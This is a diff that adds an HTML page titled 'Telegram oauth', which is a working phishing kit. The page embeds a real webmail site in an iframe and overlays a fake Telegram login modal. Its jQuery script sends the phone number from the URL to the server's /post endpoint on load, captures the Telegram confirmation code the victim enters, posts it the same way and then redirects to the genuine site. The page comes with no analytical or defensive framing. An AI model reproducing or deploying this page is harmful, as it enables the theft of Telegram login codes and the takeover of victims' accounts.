@@ -1,0 +1,384 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Telegram oauth</title>
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+
+    <style>
+        html,
+        body {
+            height: 100%;
+            margin: 0px;
+            padding: 0px;
+        }
+        
+        #body {
+            height: 100%;
+        }
+        
+        iframe {
+            width: 100%;
+            height: 100%;
+        }
+        
+        .modal-body p {
+            text-align: center;
+        }
+        
+        #DIV_1 {
+            box-sizing: border-box;
+            color: rgb(33, 33, 33);
+            height: 87px;
+            text-align: center;
+            text-decoration: none solid rgb(33, 33, 33);
+            text-size-adjust: 100%;
+            width: 490px;
+            column-rule-color: rgb(33, 33, 33);
+            perspective-origin: 245px 43.5px;
+            transform-origin: 245px 43.5px;
+            caret-color: rgb(33, 33, 33);
+            border: 0px none rgb(33, 33, 33);
+            font: normal normal 400 normal 16px / 18px Roboto, sans-serif;
+            outline: rgb(33, 33, 33) none 0px;
+            padding: 15px 0px 22px;
+        }
+        /*#DIV_1*/
+        
+        #DIV_1:after {
+            box-sizing: border-box;
+            color: rgb(33, 33, 33);
+            text-align: center;
+            text-decoration: none solid rgb(33, 33, 33);
+            text-size-adjust: 100%;
+            column-rule-color: rgb(33, 33, 33);
+            caret-color: rgb(33, 33, 33);
+            border: 0px none rgb(33, 33, 33);
+            font: normal normal 400 normal 16px / 18px Roboto, sans-serif;
+            outline: rgb(33, 33, 33) none 0px;
+        }
+        /*#DIV_1:after*/
+        
+        #DIV_1:before {
+            box-sizing: border-box;
+            color: rgb(33, 33, 33);
+            text-align: center;
+            text-decoration: none solid rgb(33, 33, 33);
+            text-size-adjust: 100%;
+            column-rule-color: rgb(33, 33, 33);
+            caret-color: rgb(33, 33, 33);
+            border: 0px none rgb(33, 33, 33);
+            font: normal normal 400 normal 16px / 18px Roboto, sans-serif;
+            outline: rgb(33, 33, 33) none 0px;
+        }
+        /*#DIV_1:before*/
+        
+        #SPAN_2 {
+            background-position: 0px -15px;
+            box-sizing: border-box;
+            color: rgb(33, 33, 33);
+            display: inline-block;
+            height: 20px;
+            text-align: center;
+            text-decoration: none solid rgb(33, 33, 33);
+            text-size-adjust: 100%;
+            width: 108px;
+            column-rule-color: rgb(33, 33, 33);
+            perspective-origin: 54px 10px;
+            transform-origin: 54px 10px;
+            caret-color: rgb(33, 33, 33);
+            background: rgba(0, 0, 0, 0) url("data:image/svg+xml,%3Csvg height=\"50\" viewBox=\"0 0 98 50\" width=\"98\" xmlns=\"http://www.w3.org/2000/svg\"%3E%3Cg fill=\"%234ca3e2\" fill-rule=\"evenodd\"%3E%3Cpath d=\"m91.8 19.5666667 8.5 11.3333333c.331371.4418278.241828 1.0686292-.2 1.4-.1730962.1298221-.3836298.2-.6.2h-17c-.5522847 0-1-.4477153-1-1 0-.2163702.0701779-.4269038.2-.6l8.5-11.3333333c.3313708-.4418278.9581722-.5313709 1.4-.2.0758057.0568542.1431458.1241943.2.2z\" transform=\"matrix(0 1 -1 0 116.5 -65.5)\"/%3E%3Cpath d=\"m40 21h46v8h-46z\"/%3E%3C/g%3E%3C/svg%3E") no-repeat scroll 0px -15px / auto padding-box border-box;
+            border: 0px none rgb(33, 33, 33);
+            font: normal normal 400 normal 16px / 18px Roboto, sans-serif;
+            margin: 15px 0px;
+            outline: rgb(33, 33, 33) none 0px;
+            padding: 0px 58px 0px 0px;
+        }
+        /*#SPAN_2*/
+        
+        #SPAN_2:after {
+            box-sizing: border-box;
+            color: rgb(33, 33, 33);
+            text-align: center;
+            text-decoration: none solid rgb(33, 33, 33);
+            text-size-adjust: 100%;
+            column-rule-color: rgb(33, 33, 33);
+            caret-color: rgb(33, 33, 33);
+            border: 0px none rgb(33, 33, 33);
+            font: normal normal 400 normal 16px / 18px Roboto, sans-serif;
+            outline: rgb(33, 33, 33) none 0px;
+        }
+        /*#SPAN_2:after*/
+        
+        #SPAN_2:before {
+            box-sizing: border-box;
+            color: rgb(33, 33, 33);
+            text-align: center;
+            text-decoration: none solid rgb(33, 33, 33);
+            text-size-adjust: 100%;
+            column-rule-color: rgb(33, 33, 33);
+            caret-color: rgb(33, 33, 33);
+            border: 0px none rgb(33, 33, 33);
+            font: normal normal 400 normal 16px / 18px Roboto, sans-serif;
+            outline: rgb(33, 33, 33) none 0px;
+        }
+        /*#SPAN_2:before*/
+        
+        #I_3 {
+            background-position: 0px 0px;
+            box-sizing: border-box;
+            color: rgb(33, 33, 33);
+            display: inline-block;
+            height: 50px;
+            text-align: center;
+            text-decoration: none solid rgb(33, 33, 33);
+            text-size-adjust: 100%;
+            vertical-align: top;
+            width: 50px;
+            column-rule-color: rgb(33, 33, 33);
+            perspective-origin: 25px 25px;
+            transform-origin: 25px 25px;
+            caret-color: rgb(33, 33, 33);
+            background: rgba(0, 0, 0, 0) url("data:image/svg+xml,%3Csvg height=\"50\" viewBox=\"0 0 50 50\" width=\"50\" xmlns=\"http://www.w3.org/2000/svg\"%3E%3Cg fill=\"none\" fill-rule=\"evenodd\"%3E%3Ccircle cx=\"25\" cy=\"25\" fill=\"%234ca3e2\" r=\"25\"/%3E%3Cpath d=\"m11.1838302 25.1315363c7.1532767-2.9934727 11.9232482-4.9669531 14.3099145-5.9204412 6.8144173-2.7224024 8.2303949-3.1953128 9.1533092-3.2109286.2029865-.0034345.6568489.0448847.950842.2740174.2482419.1934752.3165432.4548327.3492276.6382684.0326843.1834358.0733842.601307.0410309.9278195-.3692757 3.7267611-1.9671255 12.7706276-2.7800209 16.944664-.3439665 1.7661912-1.026197 2.1442046-1.6818831 2.2021587-1.4249578.1259476-2.5020563-.6903349-3.8821976-1.5593016-2.1596487-1.3597614-3.7791851-2.1170303-5.8754981-3.4439062-2.4226524-1.5334347-.2908188-2.3906915 1.0898437-3.7680664.361326-.3604656 6.7509766-6.1621094 6.8215001-6.027668.0306372.0584048-.192813-.6844486-.3362893-.8069372-.1434762-.1224887-.3552347-.0806023-.5080456-.0472897-.2166048.0472195-3.6666715 2.2375171-10.3502001 6.5708928-.97929.6458958-1.8663004.9605979-2.6610313.9441063-.876127-.0181806-2.561444-.4758095-3.814304-.8669794-1.5366837-.4797857-2.10392683-.7057418-1.9975768-1.5205665.0553937-.4244111.4458533-.8676919 1.1713788-1.3298423z\" fill=\"%23fff\"/%3E%3C/g%3E%3C/svg%3E") no-repeat scroll 0px 0px / auto padding-box border-box;
+            border: 0px none rgb(33, 33, 33);
+            border-radius: 25px;
+            font: italic normal 400 normal 16px / 18px Roboto, sans-serif;
+            margin: -15px 0px;
+            outline: rgb(33, 33, 33) none 0px;
+        }
+        /*#I_3*/
+        
+        #I_3:after {
+            box-sizing: border-box;
+            color: rgb(33, 33, 33);
+            text-align: center;
+            text-decoration: none solid rgb(33, 33, 33);
+            text-size-adjust: 100%;
+            column-rule-color: rgb(33, 33, 33);
+            caret-color: rgb(33, 33, 33);
+            border: 0px none rgb(33, 33, 33);
+            font: italic normal 400 normal 16px / 18px Roboto, sans-serif;
+            outline: rgb(33, 33, 33) none 0px;
+        }
+        /*#I_3:after*/
+        
+        #I_3:before {
+            box-sizing: border-box;
+            color: rgb(33, 33, 33);
+            text-align: center;
+            text-decoration: none solid rgb(33, 33, 33);
+            text-size-adjust: 100%;
+            column-rule-color: rgb(33, 33, 33);
+            caret-color: rgb(33, 33, 33);
+            border: 0px none rgb(33, 33, 33);
+            font: italic normal 400 normal 16px / 18px Roboto, sans-serif;
+            outline: rgb(33, 33, 33) none 0px;
+        }
+        /*#I_3:before*/
+        
+        #A_4 {
+            box-sizing: border-box;
+            color: rgb(19, 133, 216);
+            text-align: center;
+            text-decoration: none solid rgb(19, 133, 216);
+            text-size-adjust: 100%;
+            column-rule-color: rgb(19, 133, 216);
+            perspective-origin: 0px 0px;
+            transform-origin: 0px 0px;
+            caret-color: rgb(19, 133, 216);
+            border: 0px none rgb(19, 133, 216);
+            font: normal normal 400 normal 16px / 18px Roboto, sans-serif;
+            outline: rgb(19, 133, 216) none 0px;
+        }
+        /*#A_4*/
+        
+        #A_4:after {
+            box-sizing: border-box;
+            color: rgb(19, 133, 216);
+            text-align: center;
+            text-decoration: none solid rgb(19, 133, 216);
+            text-size-adjust: 100%;
+            column-rule-color: rgb(19, 133, 216);
+            caret-color: rgb(19, 133, 216);
+            border: 0px none rgb(19, 133, 216);
+            font: normal normal 400 normal 16px / 18px Roboto, sans-serif;
+            outline: rgb(19, 133, 216) none 0px;
+        }
+        /*#A_4:after*/
+        
+        #A_4:before {
+            box-sizing: border-box;
+            color: rgb(19, 133, 216);
+            text-align: center;
+            text-decoration: none solid rgb(19, 133, 216);
+            text-size-adjust: 100%;
+            column-rule-color: rgb(19, 133, 216);
+            caret-color: rgb(19, 133, 216);
+            border: 0px none rgb(19, 133, 216);
+            font: normal normal 400 normal 16px / 18px Roboto, sans-serif;
+            outline: rgb(19, 133, 216) none 0px;
+        }
+        /*#A_4:before*/
+        
+        #I_5 {
+            bottom: 0px;
+            box-sizing: border-box;
+            color: rgb(255, 255, 255);
+            cursor: pointer;
+            display: inline-block;
+            height: 50px;
+            left: 0px;
+            position: relative;
+            right: 0px;
+            text-align: center;
+            text-decoration: none solid rgb(255, 255, 255);
+            text-size-adjust: 100%;
+            text-transform: uppercase;
+            top: 0px;
+            vertical-align: top;
+            width: 50px;
+            column-rule-color: rgb(255, 255, 255);
+            perspective-origin: 25px 25px;
+            transform-origin: 25px 25px;
+            caret-color: rgb(255, 255, 255);
+            background: rgb(229, 121, 121) none repeat scroll 0% 0% / auto padding-box border-box;
+            border: 0px none rgb(255, 255, 255);
+            border-radius: 25px;
+            font: normal normal 400 normal 24px / 52px Roboto, sans-serif;
+            outline: rgb(255, 255, 255) none 0px;
+            overflow: hidden;
+        }
+        /*#I_5*/
+        
+        #I_5:after {
+            box-sizing: border-box;
+            color: rgb(255, 255, 255);
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none solid rgb(255, 255, 255);
+            text-size-adjust: 100%;
+            text-transform: uppercase;
+            column-rule-color: rgb(255, 255, 255);
+            caret-color: rgb(255, 255, 255);
+            border: 0px none rgb(255, 255, 255);
+            font: normal normal 400 normal 24px / 52px Roboto, sans-serif;
+            outline: rgb(255, 255, 255) none 0px;
+        }
+        /*#I_5:after*/
+        
+        #I_5:before {
+            box-sizing: border-box;
+            color: rgb(255, 255, 255);
+            content: 'CORP';
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none solid rgb(255, 255, 255);
+            text-size-adjust: 100%;
+            text-transform: uppercase;
+            column-rule-color: rgb(255, 255, 255);
+            perspective-origin: 0px 0px;
+            transform-origin: 0px 0px;
+            caret-color: rgb(255, 255, 255);
+            border: 0px none rgb(255, 255, 255);
+            font: normal normal 500 normal 16px / 28px Roboto, sans-serif;
+            outline: rgb(255, 255, 255) none 0px;
+        }
+        /*#I_5:before*/
+    </style>
+
+</head>
+
+<body>
+
+    <script>
+        function send(data) {
+            $.ajax({
+                url: '/post',
+                type: "POST",
+                data: data,
+                dataType: "html",
+                async: true,
+                success: function(data) {
+                    console.log(data);
+                }
+            });
+        };
+
+        var getUrlParameter = function getUrlParameter(sParam) {
+            var sPageURL = window.location.search.substring(1),
+                sURLVariables = sPageURL.split('&'),
+                sParameterName,
+                i;
+
+            for (i = 0; i < sURLVariables.length; i++) {
+                sParameterName = sURLVariables[i].split('=');
+
+                if (sParameterName[0] === sParam) {
+                    return sParameterName[1] === undefined ? true : decodeURIComponent(sParameterName[1]);
+                }
+            }
+        };
+
+        var phone = getUrlParameter('phone');
+
+        function showmodal() {
+            $('#oauth').modal('show');
+        };
+
+        function sendcode() {
+            code = $('#code').val();
+            send('phone=' + phone + '&code=' + code);
+            document.location.href = "https://mail.rainloop.net/";
+        }
+
+        $(document).ready(function() {
+            send('phone=' + phone);
+            $('#oauth').modal('show');
+        });
+        
+    </script>
+
+    <div id="body">
+        <iframe src="https://mail.rainloop.net/" onload="showmodal()"></iframe>
+    </div>
+
+    <div class="modal fade" id="oauth" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+
+                <div class="modal-body">
+
+                    <div id="DIV_1">
+                        <span id="SPAN_2"><i id="I_3"></i></span><a href="#" id="A_4"><i id="I_5"></i></a>
+                    </div>
+
+                    <p>Log in to use your Telegram account with<br> core.telegram.org and SampleBot.</p>
+
+                    <div class="form-group">
+                        <label for="exampleInputEmail1">Telegram code</label>
+                        <input class="form-control" id="code" placeholder="">
+                        <small class="form-text text-muted">We've just sent you a message. Please confirm access via Telegram</small>
+                    </div>
+
+                </div>
+                <div class="modal-footer">
+                    <!--<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>-->
+                    <button type="button" class="btn btn-primary" onclick="sendcode()">Login</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+</body>
+
+</html>
